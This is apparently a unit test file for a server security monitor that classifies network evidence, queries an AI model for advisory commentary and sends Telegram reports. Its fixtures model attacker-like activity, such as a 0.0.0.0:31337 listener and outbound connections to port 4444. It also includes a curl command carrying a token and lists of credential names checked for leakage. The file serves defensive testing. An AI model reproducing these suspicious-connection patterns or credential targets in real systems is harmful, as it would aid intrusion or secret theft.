        self.assertEqual(assessment["directions"]["outbound"], 0)
        self.assertEqual(assessment["directions"]["uncertain"], 2)
        self.assertGreaterEqual(llm_analyzer.RISK_ORDER.index(assessment["risk"]),
                                llm_analyzer.RISK_ORDER.index("medium"))

    def test_legacy_listener_records_are_uncertain(self):
        legacy = dict(self.legacy)
        legacy["network"] = {
            "unexpected_listening": [{"port": 31337, "addr": "0.0.0.0:31337"}],
            "external_connections": [],
        }
        text = "\n".join(llm_analyzer.format_assessment(legacy, "TS"))
        self.assertIn("uncertain", text)
        self.assertIn("0.0.0.0:31337", text)
        directions_line = text.split("Directions:")[1].split("\n")[0]
        self.assertIn("outbound 0", directions_line)
        self.assertIn("uncertain 1", directions_line)

    def test_prompt_marks_legacy_records_as_uncertain(self):
        prompt = llm_analyzer.build_prompt(self.legacy)
        self.assertIn("carry no owner, bind scope, or direction evidence", prompt)
        self.assertIn("uncertain", prompt)


class PromptTests(unittest.TestCase):
    def setUp(self):
        self.prompt = llm_analyzer.build_prompt(findings(MIXED))

    def test_prompt_shows_classified_evidence_totals_and_authoritative_risk(self):
        self.assertIn("CLASSIFIED NETWORK EVIDENCE", self.prompt)
        self.assertIn("AUTHORITATIVE RISK (deterministic, not yours to change)", self.prompt)
        self.assertIn("EVIDENCE POSTURE", self.prompt)
        for category in ("expected", "informational", "needs_review", "suspicious"):
            self.assertIn(category, self.prompt)
        self.assertIn("DIRECTIONS: inbound 2, outbound 2, uncertain 2", self.prompt)
        self.assertIn("inbound", self.prompt)
        self.assertIn("bind=loopback-only", self.prompt)
        self.assertIn("conf=high", self.prompt)
        self.assertIn("unrecognised script", self.prompt)
        self.assertIn("container=otel-collector", self.prompt)

    def test_prompt_has_no_blanket_port_ip_or_ephemeral_trust_claims(self):
        lowered = self.prompt.lower()
        for claim in (
            "outbound https (port 443) connections are normal",
            "only flag them as suspicious if there are many",
            "known administrator accessing via ssh",
            "ephemeral ports (32768-65535) are temporary os-assigned ports, not suspicious",
            "port 33060 is mysql x protocol",
            "121.58.203.121",
        ):
            with self.subTest(claim=claim):
                self.assertNotIn(claim, lowered)
        self.assertIn("never proof of identity", lowered)
        self.assertIn("cannot be reported as clean", lowered)

    def test_prompt_keeps_legacy_and_non_network_sections(self):
        for section in ("SECTION 1 — PROCESS ANOMALIES", "SECTION 3 — LOGGED-IN USERS",
                        "SECTION 4 — FILE SYSTEM CHANGES", "SECTION 5 — SERVICES & CRON",
                        "SECTION 6 — AUTHENTICATION LOG"):
            with self.subTest(section=section):
                self.assertIn(section, self.prompt)

    def test_prompt_does_not_leak_secrets_from_process_command_lines(self):
        secret_findings = findings([
            observation("10.0.1.5", 41000, remote=("198.51.100.5", 443),
                        name="curl", exe="/usr/bin/curl",
                        cmdline=("curl", "--token", "super-secret-value")),
        ])
        self.assertNotIn("super-secret-value", llm_analyzer.build_prompt(secret_findings))


class FormatterTests(unittest.TestCase):
    def test_formatter_shows_every_category_and_direction(self):
        text = unescape("\n".join(llm_analyzer.format_assessment(findings(MIXED), "TS")))
        self.assertIn("Risk: `MEDIUM`", text)
        self.assertIn("evidence posture: `complete`", text)
        self.assertIn("expected 2", text)
        self.assertIn("informational 2", text)
        self.assertIn("needs_review 1", text)
        self.assertIn("suspicious 1", text)
        self.assertIn("inbound 2", text)
        self.assertIn("outbound 2", text)
        self.assertIn("uncertain 2", text)
        self.assertIn("loopback-only", text)
        self.assertIn("all-interfaces", text)
        self.assertIn("unrecognised script is connecting", text)
        self.assertIn("exactly one running container publishes", text)
        self.assertIn("198.51.100.7:54001", text)
        self.assertIn("10.0.1.5:53124", text)
        self.assertIn("The risk above is computed from the collected evidence", text)

    def test_formatter_keeps_benign_and_adverse_items_and_reports_truncation(self):
        small = unescape("\n".join(llm_analyzer.format_assessment(findings(MIXED), "TS")))
        self.assertIn("suspicious", small)
        self.assertIn("docker-proxy", small)
        self.assertLess(small.index("/tmp/x.py"), small.index("docker-proxy"))
        self.assertNotIn("omitted for length", small)

        many = [dict(MIXED[4]) for _ in range(80)] + [dict(item) for item in MIXED]
        for index, item in enumerate(many):
            item = dict(item)
            item["local_port"] = 40000 + index
            many[index] = item
        chunks = llm_analyzer.format_assessment(findings(many), "TS")
        text = unescape("\n".join(chunks))

        self.assertIn("suspicious", text)
        self.assertIn("86 observation(s)", text)
        self.assertIn("Suspicious: 81 total — showing 81, 0 omitted from Telegram output.",
                      text)
        self.assertIn(
            "Needs review: 1 total — showing 1, 0 omitted from Telegram output.", text)
        # The verified remainder shares one capped pool; the notice is honest.
        self.assertIn("Expected: 2 total — showing 2, 0 omitted from Telegram output.", text)
        self.assertIn("Informational: 2 total — showing 2, 0 omitted from Telegram output.",
                      text)
        # The dishonest completeness claim and the old notices are gone.
        self.assertNotIn("every suspicious, review, and unknown item is listed above", text)
        for gone in ("omitted for length", "Truncated for message length",
                     "Adverse omissions"):
            with self.subTest(removed_notice=gone):
                self.assertNotIn(gone, text)
        # The aggregate numbers still describe the FULL observation list.
        self.assertEqual(text.count(" conf="), 86)
        self.assertIn("*Network evidence* — 86 of 86 observation(s) shown", text)
        for chunk in chunks:
            self.assertLessEqual(len(chunk), llm_analyzer.MAX_TELEGRAM_CHUNK)

    def test_every_chunk_respects_the_message_bound(self):
        many = [observation("10.0.1.5", 40000 + index, remote=("198.51.100.%d" % (index % 250 + 1), 443))
                for index in range(200)]
        # Lower-priority evidence is what the shared display pool truncates.
        many += [observation("127.0.0.1", 13133, direction="uncertain",
                             bind_scope="loopback-only", classification="expected",
                             confidence="high", is_listener=True, name="docker-proxy",
                             exe="/usr/bin/docker-proxy", user="root", state="LISTEN",
                             cmdline=("docker-proxy",))
                 for _ in range(40)]
        chunks = llm_analyzer.format_assessment(findings(many), "TS")

        self.assertGreater(len(chunks), 1)
        for chunk in chunks:
            self.assertLessEqual(len(chunk), llm_analyzer.MAX_TELEGRAM_CHUNK)
        joined = unescape("\n".join(chunks))
        self.assertIn("240 observation(s)", joined)
        self.assertIn(
            "Needs review: 200 total — showing %d, %d omitted from Telegram output." % (
                llm_analyzer.NEEDS_REVIEW_SHOWN,
                200 - llm_analyzer.NEEDS_REVIEW_SHOWN),
            joined)
        self.assertIn(
            "Expected: 40 total — showing %d, %d omitted from Telegram output." % (
                llm_analyzer.VERIFIED_SHOWN,
                40 - llm_analyzer.VERIFIED_SHOWN),
            joined)
        for gone in ("omitted for length", "Truncated for message length",
                     "Adverse omissions"):
            with self.subTest(removed_notice=gone):
                self.assertNotIn(gone, joined)

    def test_output_size_is_bounded_independently_of_the_observation_count(self):
        """REG-01..05 sizing: 10,000 items must not cost more chunks than 200."""
        def chunks_for(count):
            items = [observation("10.0.1.5", 40000 + index % 20000,
                                 remote=("198.51.100.%d" % (index % 250 + 1), 443),
                                 classification="needs_review",
                                 reason="review item %d" % index)
                     for index in range(count)]
            return llm_analyzer.format_assessment(findings(items), "TS")

        two_hundred = chunks_for(200)
        ten_thousand = chunks_for(10000)

        self.assertEqual(len(ten_thousand), len(two_hundred))
        self.assertLessEqual(len(two_hundred), 4)
        for chunk in ten_thousand:
            self.assertLessEqual(len(chunk), llm_analyzer.MAX_TELEGRAM_CHUNK)
        # Every needs_review cap line is identical: the totals are, the display is not.
        line = "Needs review: 10000 total — showing %d, %d omitted from Telegram output."
        self.assertIn(line % (llm_analyzer.NEEDS_REVIEW_SHOWN,
                              10000 - llm_analyzer.NEEDS_REVIEW_SHOWN),
                      unescape("\n".join(ten_thousand)))

    def test_evidence_gaps_and_scanner_errors_survive_into_the_report(self):
        text = "\n".join(llm_analyzer.format_assessment(
            findings(MIXED, error="Remote security scanner exited nonzero",
                     scan_status="failed", scan_gaps=["Docker identity lookup failed: denied"]),
            "TS"))
        self.assertIn("Remote security scanner exited nonzero", text)
        self.assertIn("Docker identity lookup failed: denied", text)
        self.assertIn("Risk: `", text)

    def test_advisory_text_cannot_present_a_competing_authoritative_rating(self):
        model_text = (
            "### RISK RATING\n✅ LOW\n\nEverything looks fine.\n"
        )
        chunks = llm_analyzer.format_advisory("AURORA", model_text, "TS")
        text = "\n".join(chunks)

        self.assertIn("advisory only", text)
        self.assertIn("cannot lower or raise the authoritative risk", text)
        self.assertIn("model opinion, advisory only", text)
        self.assertLessEqual(max(len(chunk) for chunk in chunks),
                             llm_analyzer.TELEGRAM_MAX_MESSAGE)

    def test_empty_advisory_response_states_the_assessment_stands(self):
        self.assertIn("authoritative assessment above stands",
                      llm_analyzer.format_advisory("AURORA", "", "TS")[0])


class ReportDeliveryTests(unittest.TestCase):
    """REG-SEC-NET-02-2: both entry paths deliver the same authoritative assessment."""

    def setUp(self):
        self.instance = {
            "name": "AURORA", "chat_id": "-1001", "is_local": True, "is_windows": False,
            "index": 1, "security": {},
        }
        self.remote = {
            "name": "AURORA EC2", "chat_id": "-1002", "is_local": False, "is_windows": False,
            "index": 2, "security": {},
        }

    def messages(self, send):
        return [call.args[1] for call in send.call_args_list]

    def test_local_on_demand_scan_sends_assessment_then_advisory(self):
        with (
            mock.patch.object(monitor, "collect_local", return_value=findings(MIXED)) as collect,
            mock.patch.object(monitor, "send_message") as send,
            mock.patch.object(llm_analyzer, "analyze_with_bedrock",
                              new=_async("### FINDINGS\nall expected")),
        ):
            monitor.cmd_security("-1001", self.instance)

        self.assertEqual(collect.call_args.args[0], "AURORA")
        self.assertEqual(collect.call_args.args[1], {})
        texts = "\n".join(self.messages(send))
        self.assertIn("Risk: `MEDIUM`", texts)
        self.assertIn("advisory only", texts)
        self.assertIn("suspicious", texts)
        self.assertIn("expected", texts)
        self.assertLess(texts.index("Risk: `MEDIUM`"), texts.index("advisory only"))
        for call in send.call_args_list:
            self.assertEqual(call.args[0], "-1001")
        for message in self.messages(send):
            self.assertLessEqual(len(message), llm_analyzer.TELEGRAM_MAX_MESSAGE)

    def test_remote_on_demand_scan_uses_the_same_assessment(self):
        with (
            mock.patch.object(monitor, "collect_remote_linux", return_value=findings(MIXED)) as collect,
            mock.patch.object(monitor, "send_message") as send,
            mock.patch.object(llm_analyzer, "analyze_with_bedrock",
                              new=_async("### RISK RATING\n✅ LOW\n")),
        ):
            monitor.cmd_security("-1002", self.remote)

        self.assertIs(collect.call_args.args[0], self.remote)
        texts = "\n".join(self.messages(send))
        self.assertIn("Risk: `MEDIUM`", texts)
        self.assertIn("model opinion, advisory only", texts)

    def test_model_exception_still_delivers_the_authoritative_assessment(self):
        with (
            mock.patch.object(monitor, "collect_local", return_value=findings(MIXED)),
            mock.patch.object(monitor, "send_message") as send,
            mock.patch.object(llm_analyzer, "analyze_with_bedrock",
                              new=_async(RuntimeError("bedrock unavailable"))),
        ):
            monitor.cmd_security("-1001", self.instance)

        texts = "\n".join(self.messages(send))
        self.assertIn("Risk: `MEDIUM`", texts)
        self.assertIn("bedrock unavailable", texts)
        self.assertIn("complete and unaffected", texts)

    def test_model_error_string_is_not_treated_as_a_report(self):
        error_text = "❌ Bedrock analysis failed: throttled"
        with (
            mock.patch.object(monitor, "collect_local", return_value=findings(MIXED)),
            mock.patch.object(monitor, "send_message") as send,
            mock.patch.object(llm_analyzer, "analyze_with_bedrock",
                              new=_async(error_text)),
        ):
            monitor.cmd_security("-1001", self.instance)

        texts = "\n".join(self.messages(send))
        self.assertIn("Risk: `MEDIUM`", texts)
        self.assertIn("AI analysis unavailable", texts)
        self.assertNotIn("AI commentary — advisory only", texts)

    def test_scanner_failure_never_reports_low(self):
        failed = findings([], error="SSH unreachable", scan_status="failed")
        with (
            mock.patch.object(monitor, "collect_remote_linux", return_value=failed),
            mock.patch.object(monitor, "send_message") as send,
            mock.patch.object(llm_analyzer, "analyze_with_bedrock",
                              new=_async("### RISK RATING\n✅ LOW\nall clear\n")),
        ):
            monitor.cmd_security("-1002", self.remote)

        texts = "\n".join(self.messages(send))
        self.assertIn("Risk: `", texts)
        self.assertNotIn("Risk: `NEGLIGIBLE`", texts)
        self.assertIn("SSH unreachable", texts)
        self.assertIn("model opinion, advisory only", texts)

    def test_nightly_job_matches_the_on_demand_assessment(self):
        old_instances = monitor.INSTANCES
        monitor.INSTANCES = [self.instance]
        try:
            with (
                mock.patch.object(monitor, "collect_local", return_value=findings(MIXED)),
                mock.patch.object(monitor, "send_message") as nightly,
                mock.patch.object(monitor, "now_ph", return_value=_timestamp()),
                mock.patch.object(llm_analyzer, "analyze_with_bedrock",
                                  new=_async(RuntimeError("bedrock unavailable"))),
            ):
                monitor.run_nightly_security_analysis()
                on_demand = mock.Mock()
                with (
                    mock.patch.object(monitor, "collect_local", return_value=findings(MIXED)),
                    mock.patch.object(monitor, "send_message", on_demand),
                    mock.patch.object(monitor, "now_ph", return_value=_timestamp()),
                    mock.patch.object(llm_analyzer, "analyze_with_bedrock",
                                      new=_async(RuntimeError("bedrock unavailable"))),
                ):
                    monitor.cmd_security("-1001", self.instance)
        finally:
            monitor.INSTANCES = old_instances

        nightly_assessment = next(
            message for message in self.messages(nightly) if "Authoritative assessment" in message)
        on_demand_assessment = next(
            message for message in self.messages(on_demand) if "Authoritative assessment" in message)
        self.assertEqual(nightly_assessment, on_demand_assessment)
        for call in nightly.call_args_list:
            self.assertEqual(call.args[0], "-1001")

    def test_nightly_job_reports_each_instance_to_its_own_chat(self):
        old_instances = monitor.INSTANCES
        monitor.INSTANCES = [self.instance, self.remote]
        try:
            with (
                mock.patch.object(monitor, "collect_local", return_value=findings(MIXED)),
                mock.patch.object(monitor, "collect_remote_linux", return_value=findings(MIXED)),
                mock.patch.object(monitor, "send_message") as send,
                mock.patch.object(llm_analyzer, "analyze_with_bedrock",
                                  new=_async("### FINDINGS\nok")),
            ):
                monitor.run_nightly_security_analysis()
        finally:
            monitor.INSTANCES = old_instances

        chats = {call.args[0] for call in send.call_args_list}
        self.assertEqual(chats, {"-1001", "-1002"})
        for chat in ("-1001", "-1002"):
            texts = "\n".join(call.args[1] for call in send.call_args_list
                              if call.args[0] == chat)
            self.assertIn("Risk: `MEDIUM`", texts)

    def test_legacy_unreachable_fixture_is_never_reported_as_clean(self):
        legacy = {
            "instance": "prod-db-03", "mode": "remote", "collected": "2026-06-25 09:00:00",
            "error": "SSH connection timed out",
            "processes": {"high_cpu": [], "high_mem": [], "suspicious_name": [],
                          "suspicious_path": [], "zombies": []},
            "network": {"unexpected_listening": [], "external_connections": []},
            "users": {"logged_in": []}, "files": {"recently_modified_system": []},
            "services": {"failed": [], "new_units": []}, "cron": {"entries": []},
            "auth_log": [],
        }
        text = "\n".join(llm_analyzer.format_assessment(legacy, "TS"))

        self.assertIn("SSH connection timed out", text)
        self.assertIn("Risk: `", text)
        self.assertNotIn("Risk: `NEGLIGIBLE`", text)
        self.assertIn("no socket evidence was collected", text)


# ─── REQUIRED REGRESSIONS REG-01..REG-12 ──────────────────


class RegDedupAndCapTests(unittest.TestCase):
    """REG-01..REG-05 — one render per observation, exact caps, bounded output."""

    def test_reg_01_one_needs_review_outbound_observation_is_rendered_exactly_once(self):
        """REG-01: an outbound needs_review observation appears once, not twice."""
        first = observation("10.0.1.5", 53124, remote=("203.0.113.10", 443),
                            direction="outbound", classification="needs_review",
                            reason="the destination is not a configured service")
        second = observation("127.0.0.1", 13133, direction="uncertain",
                             bind_scope="loopback-only", classification="expected",
                             confidence="high", is_listener=True, state="LISTEN",
                             name="docker-proxy", exe="/usr/bin/docker-proxy", user="root",
                             cmdline=("docker-proxy",))
        rendered = unescape("\n".join(
            llm_analyzer.format_assessment(findings([first, second]), "TS")))

        self.assertEqual(rendered.count("10.0.1.5:53124"), 1)
        self.assertEqual(rendered.count("the destination is not a configured service"), 1)
        self.assertNotIn("*Outbound Connections*", rendered)
        self.assertIn("Direction: Inbound 0 · Outbound 1 · Uncertain 1", rendered)

    def test_reg_02_a_local_only_listener_is_rendered_exactly_once(self):
        """REG-02: the listener state and bind scope survive the single render."""
        only_one = observation("127.0.0.1", 13133, direction="uncertain",
                               bind_scope="loopback-only", classification="needs_review",
                               confidence="low", is_listener=True, state="LISTEN",
                               name="docker-proxy", exe="/usr/bin/docker-proxy",
                               user="root", cmdline=("docker-proxy",),
                               reason="listener owner identity could not be established")
        rendered = unescape("\n".join(
            llm_analyzer.format_assessment(findings([only_one]), "TS")))

        self.assertEqual(rendered.count("127.0.0.1:13133"), 1)
        self.assertEqual(rendered.count("listener owner identity could not be"), 1)
        self.assertIn("*Network evidence*", rendered)
        self.assertIn("Listeners: 1 total — Local-only 1 · Externally reachable 0",
                      rendered)
        line = next(line for line in rendered.splitlines() if " conf=" in line)
        self.assertIn("bind=loopback-only", line)
        self.assertIn("listener=yes", line)

    def test_reg_03_an_expected_inbound_observation_is_rendered_exactly_once(self):
        """REG-03: expected inbound evidence is listed once and counted once."""
        expected_inbound = observation(
            "10.0.1.5", 8443, remote=("198.51.100.7", 54001), direction="inbound",
            bind_scope="private-interface", classification="expected", confidence="high",
            name="nginx", exe="/usr/sbin/nginx", user="www-data",
            cmdline=("nginx: worker process",), state="ESTABLISHED",
            reason="matches the configured service identity and destination")
        rendered = unescape("\n".join(
            llm_analyzer.format_assessment(findings([expected_inbound]), "TS")))

        self.assertEqual(rendered.count("10.0.1.5:8443"), 1)
        self.assertEqual(rendered.count("198.51.100.7:54001"), 1)
        self.assertIn("Direction: Inbound 1 · Outbound 0 · Uncertain 0", rendered)
        self.assertIn("Expected: 1 total — showing 1, 0 omitted from Telegram output.",
                      rendered)
        detail = rendered.split("*Network evidence*", 1)[1]
        self.assertIn("198.51.100.7:54001", detail)

    def test_reg_04_two_hundred_review_items_produce_bounded_exact_output(self):
        """REG-04: the report is bounded, and the cap accounting is exact."""
        many = [observation("10.0.1.5", 40000 + index,
                            remote=("198.51.100.%d" % (index % 250 + 1), 443),
                            classification="needs_review",
                            reason="review item %d" % index)
                for index in range(200)]
        chunks = llm_analyzer.format_assessment(findings(many), "TS")
        rendered = unescape("\n".join(chunks))

        self.assertLessEqual(len(chunks), 4)
        for chunk in chunks:
            self.assertLessEqual(len(chunk), llm_analyzer.MAX_TELEGRAM_CHUNK)
        self.assertIn("Needs review: 200 total — showing 25, 175 omitted from Telegram "
                      "output.", rendered)
        self.assertIn("200 observation(s)", rendered)
        self.assertIn("25 of 200 observation(s) shown", rendered)
        for gone in ("omitted for length", "Truncated for message length",
                     "Adverse omissions"):
            with self.subTest(removed_notice=gone):
                self.assertNotIn(gone, rendered)
        self.assertEqual(rendered.count("[needs_review]"), 25)

    def test_reg_05_every_high_risk_and_suspicious_item_stays_visible(self):
        """REG-05 (preservation guard): a confirmed deviation is never capped."""
        items = [observation("10.0.1.5", 20000 + index, remote=("203.0.113.%d" % (index + 1), 4444),
                             classification="high_risk", confidence="high",
                             reason="high risk deviation %d" % index)
                 for index in range(40)]
        items += [observation("10.0.1.5", 30000 + index, remote=("198.51.100.%d" % (index + 1), 4444),
                              classification="suspicious", confidence="medium",
                              reason="suspicious deviation %d" % index)
                  for index in range(40)]
        items += [observation("10.0.1.5", 40000 + index, remote=("100.100.100.%d" % (index + 1), 443),
                              classification="needs_review", reason="review item %d" % index)
                  for index in range(200)]
        chunks = llm_analyzer.format_assessment(findings(items), "TS")
        rendered = unescape("\n".join(chunks))

        for index in range(40):
            with self.subTest(high_risk=index):
                self.assertIn("203.0.113.%d:4444" % (index + 1), rendered)
                self.assertIn("high risk deviation %d" % index, rendered)
                self.assertIn("198.51.100.%d:4444" % (index + 1), rendered)
                self.assertIn("suspicious deviation %d" % index, rendered)
        self.assertIn("High risk: 40 total — showing 40, 0 omitted from Telegram output.",
                      rendered)
        self.assertIn("Suspicious: 40 total — showing 40, 0 omitted from Telegram output.",
                      rendered)
        self.assertEqual(rendered.count("[high_risk]"), 40)
        self.assertEqual(rendered.count("[suspicious]"), 40)


class RegAdvisoryHeaderTests(unittest.TestCase):
    """REG-06 — only chunk 1 carries the full advisory header."""

    FILLER = AdvisoryChunkBoundTests.FILLER

    def paragraph(self, length):
        text = self.FILLER * (length // len(self.FILLER) + 1)
        cut = text.rfind(" ", 0, length + 1)
        return (text[:cut] if cut > 0 else text[:length]).strip()

    def test_reg_06_continuation_chunks_do_not_reproduce_the_full_header(self):
        """REG-06: `continued n/total` replaces the repeated banner after chunk 1."""
        body = self.paragraph(9000)
        chunks = llm_analyzer.format_advisory("AURORA", body, "TS")
        furniture = AdvisoryChunkBoundTests.FURNITURE

        self.assertGreaterEqual(len(chunks), 3)
        with_rule = [chunk for chunk in chunks if "─" * 38 in chunk]
        with_stamp = [chunk for chunk in chunks if "🕐" in chunk]
        self.assertEqual(len(with_rule), 1)
        self.assertEqual(len(with_stamp), 1)
        self.assertIs(with_rule[0], chunks[0])
        self.assertIs(with_stamp[0], chunks[0])
        self.assertIn("AI Security Commentary", chunks[0])
        for index, chunk in enumerate(chunks):
            with self.subTest(chunk=index + 1):
                self.assertLessEqual(len(chunk), llm_analyzer.TELEGRAM_MAX_MESSAGE)
                if index:
                    self.assertIn("AI Security Commentary", chunk)
                    self.assertIn("continued %d/%d" % (index + 1, len(chunks)), chunk)
                    self.assertIn("AURORA", unescape(chunk))
                self.assertIn("cannot lower or raise the authoritative risk", chunk)
        stripped = "".join("".join(furniture.sub("", chunk).split()) for chunk in chunks)
        self.assertEqual(stripped, "".join(body.split()))


class RegDispatchTests(unittest.TestCase):
    """REG-07 / REG-08 — the Windows and Linux remote collectors never swap."""

    WINDOWS = {"name": "WINDBOX", "is_local": False, "is_windows": True,
               "security": {"otel_container_name": OTEL_CONTAINER}, "index": 3}
    LINUX = {"name": "AURORA EC2", "is_local": False, "is_windows": False,
             "security": {"otel_container_name": OTEL_CONTAINER}, "index": 2}

    def dispatch(self, inst, real_name):
        """
        Run the real dispatcher, recording the SSH command it sends.

        Only the SSH runner is stubbed: the collector under test still runs for
        real, so the command it builds is the command that was observed.

        Each "must not be called" collector is patched under its OWN attribute,
        never the one the chosen patch replaces. Re-patching the same attribute
        shadows the captured mock, so `call_count == 0` on it can never fail:
        REV-TEST-001. `chosen` is a separate Mock wrapping the REAL collector, so
        the command it builds is still the command the host would receive.
        """
        commands = []
        real = getattr(monitor, real_name)
        not_chosen = ("collect_remote_windows" if real_name == "collect_remote_linux"
                      else "collect_remote_linux")

        # BOTH runners are stubbed so the dispatcher cannot reach a real SSH
        # connection. Which runner the collector under test was actually handed is
        # observed, not assumed: the caller asserts it, so the stubbing can never
        # decide the answer itself.
        observed = []

        def record(target, command):
            commands.append(command)
            observed.append("plain")
            return None

        def detailed(target, command):
            commands.append(command)
            observed.append("detailed")
            return monitor.SSHResult("", "", None, False)

        chosen = mock.Mock(side_effect=real)
        mocks = {
            "local": mock.Mock(),
            "collect_remote_linux": mock.Mock(),
            "collect_remote_windows": mock.Mock(),
        }
        with (
            mock.patch.object(monitor, "ssh_run", record),
            mock.patch.object(monitor, "ssh_run_detailed", detailed),
            mock.patch.object(monitor, "collect_local", mocks["local"]),
            mock.patch.object(monitor, "collect_remote_linux",
                              mocks["collect_remote_linux"]),
            mock.patch.object(monitor, "collect_remote_windows",
                              mocks["collect_remote_windows"]),
            mock.patch.object(monitor, real_name, chosen),
        ):
            monitor._collect_security_findings(inst)
        # Exactly one SSH call was made, by the collector under test, through one
        # of the two runners: `observed` records which, so the caller can assert
        # the dispatch decision instead of assuming it.
        # The "must not be called" assertions read the mock for that OTHER
        # attribute, so none of them is satisfied by a shadowed mock.
        return (commands, mocks["local"], mocks[not_chosen], chosen,
                tuple(observed), (record, detailed))

    def test_reg_07_a_windows_instance_uses_the_windows_collector_only(self):
        """REG-07: is_windows never reaches the Linux program or command."""
        commands, local, other, chosen, observed, runners = self.dispatch(
            self.WINDOWS, "collect_remote_windows")
        plain, detailed = runners

        self.assertEqual(chosen.call_count, 1)
        chosen.assert_called_once_with(self.WINDOWS, detailed, self.WINDOWS["security"])
        # The Windows path is the one that gets the DETAILED runner, so it can
        # diagnose an empty response. This is the load-bearing half of the dispatch
        # decision, so it is asserted rather than assumed by the stubbing.
        self.assertEqual(observed, ("detailed",))
        self.assertEqual(other.call_count, 0)
        self.assertEqual(local.call_count, 0)
        # The command the real Windows collector sent over SSH:
        self.assertEqual(len(commands), 1)
        command = commands[0]
        self.assertEqual(command, security_scanner._build_remote_command_windows())
        self.assertNotEqual(command, security_scanner._build_remote_command())
        for forbidden in ("systemctl", "crontab", "auth.log", "docker", "find /etc",
                          "/sbin", "/usr/bin", "/usr/sbin", "printf", "$?", "; exit"):
            with self.subTest(forbidden=forbidden):
                self.assertNotIn(forbidden, command)

    def test_reg_08_a_linux_remote_instance_still_uses_the_linux_collector(self):
        """REG-08 (preservation guard): the Linux path is byte-for-byte unchanged."""
        commands, local, other, chosen, observed, runners = self.dispatch(
            self.LINUX, "collect_remote_linux")
        plain, _detailed = runners

        self.assertEqual(chosen.call_count, 1)
        # The Linux path keeps the PLAIN runner: it is not the path being repaired,
        # so it must not acquire the detailed runner's stderr handling.
        self.assertEqual(observed, ("plain",))
        self.assertEqual(other.call_count, 0)
        self.assertEqual(local.call_count, 0)
        self.assertEqual(len(commands), 1)
        command = commands[0]
        self.assertEqual(command, security_scanner._build_remote_command())
        self.assertTrue(command.rstrip().endswith('exit "$rc"'))
        self.assertIn("import psutil", _decoded(command))
        self.assertIs(security_scanner.collect_remote, security_scanner.collect_remote_linux)


class RegUpdateOffsetTests(unittest.TestCase):
    """REG-09 — a replayed Telegram update is never executed twice."""

    INSTANCE = {"name": "AURORA", "chat_id": "-1001", "is_local": True,
                "is_windows": False, "index": 1, "security": {}}

    def update(self, update_id, text="/security"):
        return {"update_id": update_id,
                "message": {"chat": {"id": "-1001"}, "text": text}}

    def test_reg_09_replayed_update_ids_are_not_executed_again(self):
        """REG-09 method 1: an update below the persisted offset is skipped."""
        with tempfile.TemporaryDirectory() as tmp:
            with mock.patch.dict(os.environ, {"MONITOR_BOT_STATE_DIR": tmp}):
                seen = []
                monitor.save_update_offset(5)
                self.assertEqual(monitor.load_update_offset(), 5)
                with (
                    mock.patch.dict(monitor.COMMANDS,
                                    {"/security": lambda c, i: seen.append(c)}),
                    mock.patch.dict(monitor.CHAT_TO_INSTANCE, {"-1001": self.INSTANCE}),
                    redirect_stdout(io.StringIO()),
                ):
                    offset = monitor._handle_update_batch(
                        [self.update(4), self.update(5)], 5)

                self.assertEqual(seen, ["-1001"])
                self.assertEqual(offset, 6)
                self.assertEqual(monitor.load_update_offset(), 6)

    def test_reg_09_the_offset_is_durable_before_the_handler_runs(self):
        """REG-09 method 2: the state file already covers the running command."""
        with tempfile.TemporaryDirectory() as tmp:
            with mock.patch.dict(os.environ, {"MONITOR_BOT_STATE_DIR": tmp}):
                observed = {}
                path = monitor._offset_path()

                def recorder(chat_id, inst):
                    observed["path"] = path
                    observed["text_at_call"] = open(path).read()
                    observed["mode"] = stat.S_IMODE(os.stat(path).st_mode)
                    observed["dir_mode"] = stat.S_IMODE(os.stat(tmp).st_mode)

                buffer = io.StringIO()
                with (
                    mock.patch.dict(monitor.COMMANDS, {"/security": recorder}),
                    mock.patch.dict(monitor.CHAT_TO_INSTANCE, {"-1001": self.INSTANCE}),
                    redirect_stdout(buffer),
                ):
                    offset = monitor._handle_update_batch([self.update(123456)], None)

                self.assertEqual(observed["path"],
                                 os.path.join(tmp, "telegram_offset.json"))
                self.assertEqual(observed["text_at_call"], "123457")
                self.assertEqual(offset, 123457)
                self.assertEqual(open(path).read(), "123457")
                self.assertEqual(observed["mode"], 0o600)
                self.assertEqual(observed["dir_mode"], 0o700)
                # No secret material and no key-file path ever reach the file.
                body = open(path).read()
                for forbidden in ("BOT_TOKEN", "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY",
                                  ".pem", "AWS", "TOKEN", "KEY"):
                    with self.subTest(forbidden=forbidden):
                        self.assertNotIn(forbidden, body)
                self.assertIn("[CMD] update_id=123456 /security instance=AURORA "
                              "(chat -1001)", buffer.getvalue())

    def test_reg_09_an_unwritable_state_directory_still_runs_the_command(self):
        """REG-09 method 3: a failed write never blocks execution or the batch."""
        with tempfile.TemporaryDirectory() as tmp:
            blocked = os.path.join(tmp, "blocked")
            os.mkdir(blocked)
            os.chmod(blocked, 0o500)
            try:
                with mock.patch.dict(os.environ, {"MONITOR_BOT_STATE_DIR": blocked}):
                    self.assertIsNone(monitor.load_update_offset())
                    seen = []
                    buffer = io.StringIO()
                    with (
                        mock.patch.dict(monitor.COMMANDS,
                                        {"/security": lambda c, i: seen.append(c)}),
                        mock.patch.dict(monitor.CHAT_TO_INSTANCE,
                                        {"-1001": self.INSTANCE}),
                        redirect_stdout(buffer),
                    ):
                        offset = monitor._handle_update_batch(
                            [self.update(123456), self.update(123457)], None)

                    self.assertEqual(seen, ["-1001", "-1001"])
                    self.assertEqual(offset, 123458)
                    self.assertIn("Could not persist the Telegram update offset",
                                  buffer.getvalue())
            finally:
                os.chmod(blocked, 0o700)

    def test_reg_09_the_state_file_never_lands_in_the_repository(self):
        """T4-3: the default state location is outside the source checkout."""
        with mock.patch.dict(os.environ, {}, clear=False):
            os.environ.pop("MONITOR_BOT_STATE_DIR", None)
            os.environ.pop("XDG_STATE_HOME", None)
            self.assertNotIn(str(ROOT), monitor._state_dir())
            with mock.patch.dict(os.environ, {"XDG_STATE_HOME": "/xdg"}):
                self.assertEqual(monitor._state_dir(), "/xdg/monitor_bot")

    def test_a_non_positive_persisted_offset_is_treated_as_absent(self):
        """REV-OFFSET-001: a wedged offset never blocks the poll loop."""
        with tempfile.TemporaryDirectory() as tmp:
            with mock.patch.dict(os.environ, {"MONITOR_BOT_STATE_DIR": tmp}):
                path = monitor._offset_path()
                for unusable in ("0", "-5", "", "   ", "abc", "12.5"):
                    with self.subTest(persisted=unusable):
                        with open(path, "w") as handle:
                            handle.write(unusable)
                        self.assertIsNone(monitor.load_update_offset())
